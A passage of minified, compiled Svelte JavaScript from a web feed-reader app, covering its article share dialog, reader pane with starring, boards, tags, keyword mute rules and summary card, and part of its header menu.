<button data-testid="share-link-copy" class="svelte-1b1u3cc">Copy link</button></div>`,1),xs=U(`<div class="backdrop svelte-1b1u3cc" role="dialog" aria-modal="true" aria-labelledby="share-modal-title" data-testid="share-modal"><div class="modal svelte-1b1u3cc"><header class="svelte-1b1u3cc"><h2 id="share-modal-title" class="svelte-1b1u3cc">Share article</h2> <button class="close svelte-1b1u3cc" aria-label="Close">×</button></header> <p class="subject svelte-1b1u3cc"> </p> <div class="tabs svelte-1b1u3cc" role="tablist"><button role="tab" data-testid="share-tab-user">User</button> <button role="tab" data-testid="share-tab-email">Email</button> <button role="tab" data-testid="share-tab-link">Copy link</button></div> <!> <!></div></div>`);function Ss(e,t){qe(t,!0);let n=()=>M(Da,`$articles`,i),r=()=>M(Yi,`$user`,i),[i,a]=gt(),o=P(`user`),s=P(hn([])),c=P(``),l=P(``),u=P(``),d=P(!1),f=P(!1),p=P(``),m=P(``),h=Qt(()=>n().items.find(e=>e.id===t.articleId)?.url??``),g=Qt(()=>n().items.find(e=>e.id===t.articleId)?.summary??``);Gi(async()=>{try{F(s,((await $.listUsers()).data??[]).filter(e=>e.id!==r()?.id),!0)}catch(e){F(u,e instanceof Z?e.message:String(e),!0)}});async function _(){if(V(c)===``){F(u,`select a recipient`);return}F(u,``),F(f,!0);try{await $.createShare(t.articleId,Number(V(c)),V(l).trim()||void 0),F(d,!0),setTimeout(t.onClose,800)}catch(e){F(u,e instanceof Z?e.message:String(e),!0)}finally{F(f,!1)}}function v(){let e=encodeURIComponent(t.articleTitle),n=[t.articleTitle];V(g)&&n.push(``,V(g)),V(h)&&n.push(``,V(h)),V(l).trim()&&n.push(``,`— `+V(l).trim());let r=encodeURIComponent(n.join(`
+`)),i=encodeURIComponent(V(m).trim());location.href=`mailto:${i}?subject=${e}&body=${r}`}async function y(){if(!V(h)){F(p,`No URL to copy`);return}try{await navigator.clipboard.writeText(V(h)),F(p,`Link copied to clipboard`)}catch{F(p,`Copy failed — please copy manually`)}}var b=xs(),x=I(b),S=I(x),C=R(I(S),2);j(S);var w=R(S,2),ee=I(w,!0);j(w);var te=R(w,2),T=I(te);let E;var ne=R(T,2);let re;var D=R(ne,2);let O;j(te);var ie=R(te,2),ae=e=>{var t=ps(),n=I(t,!0);j(t),z(()=>G(n,V(u))),W(e,t)};K(ie,e=>{V(u)&&e(ae)});var oe=R(ie,2),se=e=>{var n=$r(),r=L(n),i=e=>{W(e,ms())},a=e=>{W(e,hs())},o=e=>{var n=_s(),r=L(n),i=R(I(r),2),a=I(i);a.value=a.__value=``,li(R(a),17,()=>V(s),e=>e.id,(e,t)=>{var n=gs(),r=I(n,!0);j(n);var i={};z(()=>{G(r,V(t).username),i!==(i=V(t).id)&&(n.value=(n.__value=V(t).id)??``)}),W(e,n)}),j(i),j(r);var o=R(r,2),u=R(I(o),2);jn(u),j(o);var d=R(o,2),p=I(d),m=R(p,2),h=I(m,!0);j(m),j(d),z(()=>{m.disabled=V(f)||V(c)===``,G(h,V(f)?`Sending…`:`Send`)}),Ti(i,()=>V(c),e=>F(c,e)),X(u,()=>V(l),e=>F(l,e)),H(`click`,p,function(...e){t.onClose?.apply(this,e)}),H(`click`,m,_),W(e,n)};K(r,e=>{V(d)?e(i):V(s).length===0?e(a,1):e(o,-1)}),W(e,n)},ce=e=>{var n=vs(),r=L(n),i=R(I(r),2);J(i),j(r);var a=R(r,2),o=R(I(a),2);jn(o),j(a);var s=R(a,4),c=I(s),u=R(c,2);j(s),X(i,()=>V(m),e=>F(m,e)),X(o,()=>V(l),e=>F(l,e)),H(`click`,c,function(...e){t.onClose?.apply(this,e)}),H(`click`,u,v),W(e,n)},le=e=>{var n=bs(),r=L(n),i=R(I(r),2);J(i),j(r);var a=R(r,2),o=e=>{var t=ys(),n=I(t,!0);j(t),z(()=>G(n,V(p))),W(e,t)};K(a,e=>{V(p)&&e(o)});var s=R(a,2),c=I(s),l=R(c,2);j(s),z(()=>{ji(i,V(h)),l.disabled=!V(h)}),H(`focus`,i,e=>e.currentTarget.select()),H(`click`,c,function(...e){t.onClose?.apply(this,e)}),H(`click`,l,y),W(e,n)};K(oe,e=>{V(o)===`user`?e(se):V(o)===`email`?e(ce,1):V(o)===`link`&&e(le,2)}),j(x),j(b),z(()=>{G(ee,t.articleTitle),Y(T,`aria-selected`,V(o)===`user`),E=q(T,1,`svelte-1b1u3cc`,null,E,{on:V(o)===`user`}),Y(ne,`aria-selected`,V(o)===`email`),re=q(ne,1,`svelte-1b1u3cc`,null,re,{on:V(o)===`email`}),Y(D,`aria-selected`,V(o)===`link`),O=q(D,1,`svelte-1b1u3cc`,null,O,{on:V(o)===`link`})}),H(`click`,C,function(...e){t.onClose?.apply(this,e)}),H(`click`,T,()=>F(o,`user`)),H(`click`,ne,()=>F(o,`email`)),H(`click`,D,()=>F(o,`link`)),H(`click`,x,Bi(function(e){Ui.call(this,t,e)})),H(`click`,b,function(...e){t.onClose?.apply(this,e)}),W(e,b),Je(),a()}var Cs=U(`<div class="reader-empty svelte-1hmgvz1"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" class="svelte-1hmgvz1"><path d="M2 3h6a4 4 0 0 1 4 4v14a3 3 0 0 0-3-3H2z"></path><path d="M22 3h-6a4 4 0 0 0-4 4v14a3 3 0 0 1 3-3h7z"></path></svg> <div class="big svelte-1hmgvz1">Pick a story</div> <div>Pick an article from the list to read.</div></div>`),ws=Zr(`<svg viewBox="0 0 24 24" fill="currentColor" class="svelte-1hmgvz1"><path d="M12 2l3 6.3 6.9 1-5 4.9 1.2 6.8L12 17.8 5.9 21l1.2-6.8-5-4.9 6.9-1z"></path></svg> Starred`,1),Ts=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1hmgvz1"><path d="M12 2l3 6.3 6.9 1-5 4.9 1.2 6.8L12 17.8 5.9 21l1.2-6.8-5-4.9 6.9-1z"></path></svg> Star`,1),Es=U(`<span class="board-msg svelte-1hmgvz1" data-testid="reader-reextract-msg"> </span>`),Ds=U(`<button class="board-picker-remove svelte-1hmgvz1" data-testid="picker-board-remove"> </button> <div class="board-picker-sep svelte-1hmgvz1"></div>`,1),Os=U(`<div class="board-picker-empty svelte-1hmgvz1">No boards yet. Create one in the sidebar.</div>`),ks=U(`<button class="svelte-1hmgvz1"> </button>`),As=U(`<div class="board-picker svelte-1hmgvz1" data-board-picker=""><!> <!></div>`),js=U(`<span class="board-msg svelte-1hmgvz1"> </span>`),Ms=U(`<div class="board-picker mute-picker svelte-1hmgvz1" data-mute-picker=""><input type="text" placeholder="keyword in title" data-testid="mute-input" class="svelte-1hmgvz1"/> <button data-testid="mute-submit" class="svelte-1hmgvz1"> </button> <div class="board-picker-empty svelte-1hmgvz1">Future articles with this word in the title will be hidden. Manage all rules in Settings → Filters.</div></div>`),Ns=U(`<a class="ra-btn primary svelte-1hmgvz1" target="_blank" rel="noopener noreferrer"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1hmgvz1"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path><path d="M15 3h6v6M10 14L21 3"></path></svg> Original</a>`),Ps=U(`<span class="source-badge svelte-1hmgvz1"> </span>`),Fs=U(`<span class="dup-badge svelte-1hmgvz1" title="Also published in other feeds you subscribe to"> </span>`),Is=U(`<span class="src-time svelte-1hmgvz1"> </span>`),Ls=U(`<span class="tag-chip svelte-1hmgvz1"> <button class="tag-chip-x svelte-1hmgvz1">×</button></span>`),Rs=U(`<span class="model svelte-1hmgvz1"> </span>`),zs=U(`<p class="ai-para svelte-1hmgvz1"> </p>`),Bs=U(`<li class="svelte-1hmgvz1"> </li>`),Vs=U(`<ul class="svelte-1hmgvz1"></ul>`),Hs=U(`<div class="ai-body svelte-1hmgvz1" id="ai-body"><div class="ai-text svelte-1hmgvz1"><!> <!></div></div>`),Us=U(`<aside class="ai-card svelte-1hmgvz1" data-testid="summary-card"><header class="ai-head svelte-1hmgvz1"><svg class="ai-spark svelte-1hmgvz1" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2l1.6 6.4L20 10l-6.4 1.6L12 18l-1.6-6.4L4 10l6.4-1.6z"></path></svg> <h4 class="svelte-1hmgvz1">Summary</h4> <!> <button class="ai-toggle svelte-1hmgvz1" aria-controls="ai-body" data-testid="summary-toggle"> <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="6 9 12 15 18 9"></polyline></svg></button></header> <!></aside>`),Ws=U(`<p> </p>`),Gs=U(`<button class="scroll-top-btn svelte-1hmgvz1" aria-label="Scroll to top" title="Scroll to top" data-testid="reader-scroll-top"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" aria-hidden="true" class="svelte-1hmgvz1"><polyline points="18 15 12 9 6 15"></polyline></svg></button>`),Ks=U(`<div class="reader-inner svelte-1hmgvz1"><div class="reader-actions svelte-1hmgvz1"><button data-testid="reader-star"><!></button> <button><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1hmgvz1"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z"></path></svg> </button> <button class="ra-btn svelte-1hmgvz1" data-testid="reader-share"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1hmgvz1"><circle cx="18" cy="5" r="3"></circle><circle cx="6" cy="12" r="3"></circle><circle cx="18" cy="19" r="3"></circle><path d="M8.6 13.5l6.8 4M15.4 6.5l-6.8 4"></path></svg> Share</button> <button class="ra-btn svelte-1hmgvz1" data-testid="reader-reextract" title="Re-run the full-article extractor against the source URL"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1hmgvz1"><path d="M21 12a9 9 0 0 1-15.3 6.4L3 21"></path><path d="M3 12a9 9 0 0 1 15.3-6.4L21 3"></path><polyline points="3 21 3 15 9 15"></polyline><polyline points="21 3 21 9 15 9"></polyline></svg> </button> <!> <div class="board-wrap svelte-1hmgvz1"><button class="ra-btn svelte-1hmgvz1" data-board-trigger="" data-testid="reader-board"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1hmgvz1"><rect x="3" y="3" width="7" height="7" rx="1"></rect><rect x="14" y="3" width="7" height="7" rx="1"></rect><rect x="3" y="14" width="7" height="7" rx="1"></rect></svg> Board</button> <!> <!></div> <div class="board-wrap svelte-1hmgvz1"><button class="ra-btn svelte-1hmgvz1" data-mute-trigger="" data-testid="reader-mute" title="Hide articles whose title contains a keyword"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1hmgvz1"><path d="M3 9v6h4l5 4V5L7 9H3z"></path><line x1="22" y1="5" x2="14" y2="13"></line><line x1="14" y1="5" x2="22" y2="13"></line></svg> Mute</button> <!></div> <span style="flex:1" class="svelte-1hmgvz1"></span> <!></div> <div class="article-kicker svelte-1hmgvz1"><span class="favicon svelte-1hmgvz1"> </span> <span class="src-name svelte-1hmgvz1"> </span> <!> <!> <span class="src-time svelte-1hmgvz1"> </span> <!></div> <h1 class="article-h1 svelte-1hmgvz1"> </h1> <div class="tag-row svelte-1hmgvz1" data-testid="article-tags"><!> <input type="text" class="tag-input svelte-1hmgvz1" data-testid="tag-input"/></div> <!> <div class="article-body svelte-1hmgvz1"><!></div></div> <!> <!>`,1),qs=U(`<section class="reader svelte-1hmgvz1" id="reader"><!></section>`);function Js(e,t){qe(t,!0);let n=()=>M(fa,`$selectedArticleId`,l),r=()=>M(Da,`$articles`,l),i=()=>M(na,`$feeds`,l),a=()=>M(da,`$activeView`,l),o=()=>M(ia,`$boards`,l),s=()=>M(wa,`$showSummary`,l),c=()=>M(Ta,`$summaryCollapsed`,l),[l,u]=gt(),d=Qt(()=>n()===null?null:r().items.find(e=>e.id===n())??null),f=Qt(()=>V(d)?i().find(e=>e.id===V(d).feed_id)??null:null),p=-1;Vn(()=>{V(d)&&(V(d).is_read||p!==V(d).id&&(p=V(d).id,Ma([V(d).id],!0)))});let m=P(!1),h=P(!1),g=P(``),_=P(!1),v=P(``),y=P(!1),b=P(void 0),x=P(!1);function S(){V(b)&&F(x,V(b).scrollTop>400)}function C(){V(b)&&(V(b).scrollTop=0)}Vn(()=>{n(),V(b)&&(V(b).scrollTop=0),F(x,!1)});let w=P(hn([])),ee=P(``),te=P(!1),T=P(null);async function E(){if(V(d)&&V(T)!==V(d).id){F(T,V(d).id,!0);try{F(w,(await $.listArticleTags(V(d).id)).data??[],!0)}catch{F(w,[],!0)}}}async function ne(){let e=V(ee).trim();if(!(!e||!V(d))){F(te,!0);try{F(w,(await $.addArticleTag(V(d).id,e)).data??[],!0),F(ee,``)}catch(e){console.error(`addTag`,e)}finally{F(te,!1)}}}async function re(e){if(V(d))try{F(w,(await $.removeArticleTag(V(d).id,e)).data??[],!0)}catch(e){console.error(`removeTag`,e)}}Vn(()=>{V(d),V(d)?E():(F(w,[],!0),F(T,null))});let D=P(!1),O=P(``);async function ie(){if(V(d)){F(D,!0),F(O,``);try{let e=V(d).id,t=await $.reExtractArticle(e);if(t.meta?.status===`no_change`||t.data&&`status`in t.data&&t.data.status===`no_change`)F(O,`No new content found`);else if(t.data&&`id`in t.data){let n=t.data;Da.update(t=>({...t,items:t.items.map(t=>t.id===e?{...t,...n}:t)})),F(O,`Updated`)}}catch(e){F(O,e instanceof Z?e.message:String(e),!0)}finally{F(D,!1),setTimeout(()=>F(O,``),3e3)}}}async function ae(){let e=V(v).trim();if(e){F(y,!0);try{await $.createFilter({name:`Mute: ${e}`,match_json:JSON.stringify({field:`title`,op:`contains`,value:e}),action:`hide`,enabled:!0}),F(g,`Muting "${e}" in titles`),F(v,``),F(_,!1),setTimeout(()=>F(g,``),2400)}catch(e){F(g,e instanceof Z?e.message:String(e),!0),setTimeout(()=>F(g,``),4e3)}finally{F(y,!1)}}}function oe(e){let t=e.target;V(h)&&!t.closest(`[data-board-picker]`)&&!t.closest(`[data-board-trigger]`)&&F(h,!1),V(_)&&!t.closest(`[data-mute-picker]`)&&!t.closest(`[data-mute-trigger]`)&&F(_,!1)}Gi(()=>document.addEventListener(`click`,oe)),Ki(()=>document.removeEventListener(`click`,oe));async function se(e,t){if(V(d)){F(h,!1);try{await $.addToBoard(e,V(d).id),F(g,`Added to "${t}"`),setTimeout(()=>F(g,``),2400)}catch(e){F(g,e instanceof Z?e.message:String(e),!0),setTimeout(()=>F(g,``),4e3)}}}async function ce(e,t){if(!V(d))return;F(h,!1);let n=V(d).id;try{await $.removeFromBoard(e,n),F(g,`Removed from "${t}"`),setTimeout(()=>F(g,``),2400);let r=a();r.kind===`board`&&r.id===e&&(fa.set(null),ja(r))}catch(e){F(g,e instanceof Z?e.message:String(e),!0),setTimeout(()=>F(g,``),4e3)}}let le=[`#ff6154`,`#0a0a0a`,`#e63946`,`#1d4ed8`,`#623ce6`,`#ee0000`,`#326ce5`,`#111`,`#cc0000`,`#bb1919`];function ue(e){return le[e%le.length]}function de(e){if(!e)return``;let t=Date.now()/1e3-e;return t<60?`just now`:t<3600?`${Math.round(t/60)} min ago`:t<86400?`${Math.round(t/3600)} hr ago`:`${Math.round(t/86400)} d ago`}function fe(){if(!V(d))return 0;let e=V(d).content_text||(V(d).content_html?V(d).content_html.replace(/<[^>]+>/g,` `):``);if(!e)return 0;let t=e.trim().split(/\s+/).length;return Math.max(1,Math.round(t/200))}let pe=Qt(()=>{if(!V(d)?.summary)return{paragraph:``,bullets:[]};let e=V(d).summary.split(/\n/),t=e.findIndex(e=>/^[•\-\*]\s+/.test(e.trim()));return t<0?{paragraph:V(d).summary.trim(),bullets:[]}:{paragraph:e.slice(0,t).join(`
+`).trim(),bullets:e.slice(t).map(e=>e.replace(/^\s*[•\-\*]\s*/,``).trim()).filter(e=>e.length>0)}});function me(){Ta.update(e=>!e)}var he=qs(),ge=I(he),_e=e=>{W(e,Cs())},ve=e=>{var t=Ks(),n=L(t),r=I(n),i=I(r);let l;var u=I(i),p=e=>{var t=ws();Ie(),W(e,t)},b=e=>{var t=Ts();Ie(),W(e,t)};K(u,e=>{V(d).is_starred?e(p):e(b,-1)}),j(i);var S=R(i,2);let T;var E=R(I(S));j(S);var oe=R(S,2),le=R(oe,2),he=R(I(le));j(le);var ge=R(le,2),_e=e=>{var t=Es(),n=I(t,!0);j(t),z(()=>G(n,V(O))),W(e,t)};K(ge,e=>{V(O)&&e(_e)});var ve=R(ge,2),ye=I(ve),be=R(ye,2),xe=e=>{var t=As(),n=I(t),r=e=>{let t=Qt(()=>a().id),n=Qt(()=>o().find(e=>e.id===V(t)));var r=$r(),i=L(r),s=e=>{var t=Ds(),r=L(t),i=I(r);j(r),Ie(2),z(()=>G(i,`Remove from "${V(n).name??``}"`)),H(`click`,r,()=>ce(V(n).id,V(n).name)),W(e,t)};K(i,e=>{V(n)&&e(s)}),W(e,r)};K(n,e=>{a().kind===`board`&&e(r)});var i=R(n,2),s=e=>{W(e,Os())},c=e=>{var t=$r();li(L(t),1,o,e=>e.id,(e,t)=>{var n=ks(),r=I(n,!0);j(n),z(()=>{Y(n,`data-testid`,`picker-board-${V(t).id??``}`),G(r,V(t).name)}),H(`click`,n,()=>se(V(t).id,V(t).name)),W(e,n)}),W(e,t)};K(i,e=>{o().length===0?e(s):e(c,-1)}),j(t),W(e,t)};K(be,e=>{V(h)&&e(xe)});var Se=R(be,2),Ce=e=>{var t=js(),n=I(t,!0);j(t),z(()=>G(n,V(g))),W(e,t)};K(Se,e=>{V(g)&&e(Ce)}),j(ve);var we=R(ve,2),Te=I(we),Ee=R(Te,2),De=e=>{var t=Ms(),n=I(t);J(n);var r=R(n,2),i=I(r,!0);j(r),Ie(2),j(t),z(e=>{n.disabled=V(y),r.disabled=e,G(i,V(y)?`Muting…`:`Add mute rule`)},[()=>V(y)||!V(v).trim()]),X(n,()=>V(v),e=>F(v,e)),H(`keydown`,n,e=>{e.key===`Enter`&&ae()}),H(`click`,r,ae),W(e,t)};K(Ee,e=>{V(_)&&e(De)}),j(we);var Oe=R(we,4),ke=e=>{var t=Ns();z(()=>Y(t,`href`,V(d).url)),W(e,t)};K(Oe,e=>{V(d).url&&e(ke)}),j(r);var Ae=R(r,2),je=I(Ae),Me=I(je,!0);j(je);var k=R(je,2),Ne=I(k,!0);j(k);var A=R(k,2),Pe=e=>{var t=Ps(),n=I(t,!0);j(t),z(e=>G(n,e),[()=>V(d).tags.split(`,`)[0].trim()]),W(e,t)};K(A,e=>{V(d).tags&&e(Pe)});var Fe=R(A,2),Le=e=>{var t=Fs(),n=I(t);j(t),z(()=>G(n,`Also in ${V(d).dup_count+1} feeds`)),W(e,t)};K(Fe,e=>{V(d).dup_count>0&&e(Le)});var Re=R(Fe,2),ze=I(Re);j(Re);var Be=R(Re,2),Ve=e=>{var t=Is(),n=I(t);j(t),z(e=>G(n,`· ${e??``} min read`),[()=>fe()]),W(e,t)},He=Qt(()=>fe()>0);K(Be,e=>{V(He)&&e(Ve)}),j(Ae);var Ue=R(Ae,2),We=I(Ue,!0);j(Ue);var Ge=R(Ue,2),Ke=I(Ge);li(Ke,16,()=>V(w),e=>e,(e,t)=>{var n=Ls(),r=I(n),i=R(r);j(n),z(()=>{G(r,`#${t??``} `),Y(i,`aria-label`,`Remove tag ${t}`),Y(i,`title`,`Remove tag ${t}`)}),H(`click`,i,()=>re(t)),W(e,n)});var qe=R(Ke,2);J(qe),j(Ge);var Je=R(Ge,2),Ye=e=>{var t=Us(),n=I(t),r=R(I(n),4),i=e=>{var t=Rs(),n=I(t);j(t),z(()=>G(n,`local · ${V(d).summary_model??``}`)),W(e,t)};K(r,e=>{V(d).summary_model&&e(i)});var a=R(r,2),o=I(a),s=R(o);let l;j(a),j(n);var u=R(n,2),f=e=>{var t=Hs(),n=I(t),r=I(n),i=e=>{var t=$r();li(L(t),17,()=>V(pe).paragraph.split(/\n{2,}/),ai,(e,t)=>{var n=zs(),r=I(n,!0);j(n),z(()=>G(r,V(t))),W(e,n)}),W(e,t)};K(r,e=>{V(pe).paragraph&&e(i)});var a=R(r,2),o=e=>{var t=Vs();li(t,21,()=>V(pe).bullets,ai,(e,t)=>{var n=Bs(),r=I(n,!0);j(n),z(()=>G(r,V(t))),W(e,n)}),j(t),W(e,t)};K(a,e=>{V(pe).bullets.length>0&&e(o)}),j(n),j(t),W(e,t)};K(u,e=>{c()||e(f)}),j(t),z(()=>{Y(a,`aria-expanded`,!c()),G(o,`${c()?`Show`:`Hide`} `),l=q(s,0,`svelte-1hmgvz1`,null,l,{rot:c()})}),H(`click`,a,me),W(e,t)};K(Je,e=>{s()&&(V(pe).paragraph||V(pe).bullets.length>0)&&e(Ye)});var Xe=R(Je,2),Ze=I(Xe),Qe=e=>{var t=$r();hi(L(t),()=>V(d).content_html),W(e,t)},$e=e=>{var t=$r();hi(L(t),()=>V(d).cleaned_html),W(e,t)},et=e=>{var t=Ws(),n=I(t,!0);j(t),z(()=>G(n,V(d).content_text)),W(e,t)};K(Ze,e=>{V(d).content_html?e(Qe):V(d).cleaned_html?e($e,1):V(d).content_text&&e(et,2)}),j(Xe),j(n);var tt=R(n,2),nt=e=>{Ss(e,{get articleId(){return V(d).id},get articleTitle(){return V(d).title},onClose:()=>F(m,!1)})};K(tt,e=>{V(m)&&e(nt)});var rt=R(tt,2),it=e=>{var t=Gs();H(`click`,t,C),W(e,t)};K(rt,e=>{V(x)&&e(it)}),z((e,t,n)=>{l=q(i,1,`ra-btn svelte-1hmgvz1`,null,l,{starred:V(d).is_starred}),T=q(S,1,`ra-btn svelte-1hmgvz1`,null,T,{starred:V(d).is_later}),G(E,` ${V(d).is_later?`Saved`:`Read later`}`),le.disabled=V(D),G(he,` ${V(D)?`Extracting…`:`Re-extract`}`),Si(je,`background:${e??``}`),G(Me,t),G(Ne,V(f)?.title_override||V(f)?.title||``),G(ze,`· ${n??``}`),G(We,V(d).title),Y(qe,`placeholder`,V(w).length===0?`Add tag…`:`+ tag`),qe.disabled=V(te)},[()=>ue(V(d).feed_id),()=>(V(f)?.title||`?`)[0]?.toUpperCase(),()=>de(V(d).published_at)]),H(`click`,i,()=>Na(V(d).id,!V(d).is_starred)),H(`click`,S,()=>Pa(V(d).id,!V(d).is_later)),H(`click`,oe,()=>F(m,!0)),H(`click`,le,ie),H(`click`,ye,e=>{e.stopPropagation(),F(h,!V(h))}),H(`click`,Te,e=>{e.stopPropagation(),F(_,!V(_))}),X(qe,()=>V(ee),e=>F(ee,e)),H(`keydown`,qe,e=>{e.key===`Enter`&&ne()}),H(`blur`,qe,()=>V(ee).trim()&&ne()),W(e,t)};K(ge,e=>{V(d)?e(ve,-1):e(_e)}),j(he),zi(he,e=>F(b,e),()=>V(b)),H(`scroll`,he,S),W(e,he),Je(),u()}var Ys=U(`<button class="mobile-icon-btn svelte-1h259us" aria-label="Back to article list" data-testid="mobile-back"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2.2"><path d="M15 18l-6-6 6-6"></path></svg></button>`),Xs=U(`<button class="mobile-icon-btn svelte-1h259us" aria-label="Open sidebar" data-testid="mobile-menu"><svg viewBox="0 0 24 24" width="22" fill="none" stroke="currentColor" stroke-width="2.2"><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="18" x2="21" y2="18"></line></svg></button>`),Zs=U(`<button type="button" class="search-clear svelte-1h259us" aria-label="Clear search" title="Clear search (Esc)" data-testid="search-clear">×</button>`),Qs=U(`<span class="kbd svelte-1h259us">/</span>`),$s=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><rect x="3" y="4" width="18" height="16" rx="2"></rect><path d="M9 4v16"></path><path d="M14 12l3-3M14 12l3 3"></path></svg>`),ec=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><rect x="3" y="4" width="18" height="16" rx="2"></rect><path d="M9 4v16"></path></svg>`),tc=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"></path></svg>`),nc=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"></path></svg>`),rc=U(`<button class="icon-btn svelte-1h259us" data-testid="toggle-sidebar"><!></button> <button title="Refresh feeds now"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><path d="M21 12a9 9 0 1 1-3-6.7L21 8"></path><path d="M21 3v5h-5"></path></svg></button> <button class="icon-btn svelte-1h259us" title="Toggle theme"><!></button>`,1),ic=U(`<span class="who svelte-1h259us"> <small class="svelte-1h259us"> </small></span>`),ac=U(`<span class="avatar svelte-1h259us"> </span> <!>`,1),oc=U(`<p class="import-msg svelte-1h259us" data-testid="opml-msg"> </p>`),sc=U(`<a target="_blank" rel="noopener noreferrer" class="svelte-1h259us"> </a>`),cc=U(`<div class="search-results svelte-1h259us" data-search-results="" data-testid="search-results"></div>`),lc=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><circle cx="12" cy="12" r="4"></circle><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"></path></svg> Switch to light`,1),uc=Zr(`<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><path d="M21 12.8A9 9 0 1 1 11.2 3a7 7 0 0 0 9.8 9.8Z"></path></svg> Switch to dark`,1),dc=U(`<button class="pop-item svelte-1h259us" data-testid="mobile-refresh"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><path d="M21 12a9 9 0 1 1-3-6.7L21 8"></path><path d="M21 3v5h-5"></path></svg> Refresh feeds</button> <button class="pop-item svelte-1h259us" data-testid="mobile-theme"><!></button> <div class="pop-sep svelte-1h259us"></div>`,1),fc=U(`<div class="popover svelte-1h259us" data-popover="" role="menu"><div class="pop-user svelte-1h259us"><span class="avatar svelte-1h259us"> </span> <div><div class="pop-name svelte-1h259us"> </div> <div class="pop-mail svelte-1h259us"> </div></div></div> <!> <button class="pop-item svelte-1h259us" data-testid="open-settings"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><circle cx="12" cy="12" r="3"></circle><path d="M19.4 15a1.7 1.7 0 0 0 .4 1.9l.1.1a2 2 0 1 1-2.8 2.8l-.1-.1a1.7 1.7 0 0 0-1.9-.4 1.7 1.7 0 0 0-1 1.5V21a2 2 0 1 1-4 0v-.1a1.7 1.7 0 0 0-1.1-1.6 1.7 1.7 0 0 0-1.9.4l-.1.1A2 2 0 1 1 4.2 17l.1-.1a1.7 1.7 0 0 0 .4-1.9 1.7 1.7 0 0 0-1.5-1H3a2 2 0 1 1 0-4h.1a1.7 1.7 0 0 0 1.6-1.1 1.7 1.7 0 0 0-.4-1.9l-.1-.1A2 2 0 1 1 7 4.2l.1.1a1.7 1.7 0 0 0 1.9.4H9a1.7 1.7 0 0 0 1-1.5V3a2 2 0 1 1 4 0v.1a1.7 1.7 0 0 0 1 1.5 1.7 1.7 0 0 0 1.9-.4l.1-.1a2 2 0 1 1 2.8 2.8l-.1.1a1.7 1.7 0 0 0-.4 1.9V9a1.7 1.7 0 0 0 1.5 1H21a2 2 0 1 1 0 4h-.1a1.7 1.7 0 0 0-1.5 1Z"></path></svg> Settings</button> <button class="pop-item svelte-1h259us" data-testid="open-opml-import"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><path d="M7 10l5 5 5-5"></path><path d="M12 15V3"></path></svg> Import OPML</button> <button class="pop-item svelte-1h259us"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><path d="M7 10l5-5 5 5"></path><path d="M12 5v12"></path></svg> Export OPML</button> <div class="pop-sep svelte-1h259us"></div> <button class="pop-item svelte-1h259us" data-testid="logout"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" class="svelte-1h259us"><path d="M9 21H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h4M16 17l5-5-5-5M21 12H9"></path></svg> Sign out</button></div>`),pc=U(`<header><!> <div class="brand svelte-1h259us"><span class="kite svelte-1h259us" aria-hidden="true"><svg viewBox="0 0 64 64" class="svelte-1h259us"><defs><linearGradient id="brand-emb" x1="0" y1="0" x2="1" y2="1"><stop offset="0" stop-color="var(--ember-soft)"></stop><stop offset="1" stop-color="var(--ember)"></stop></linearGradient></defs><circle cx="13" cy="15" r="6.5" fill="url(#brand-emb)"></circle><rect x="25" y="11.5" width="31" height="8" rx="4" fill="var(--ink)"></rect><rect x="8" y="28" width="48" height="8" rx="4" fill="var(--ink)"></rect><rect x="8" y="44.5" width="34" height="8" rx="4" fill="url(#brand-emb)"></rect></svg></span> </div> <form 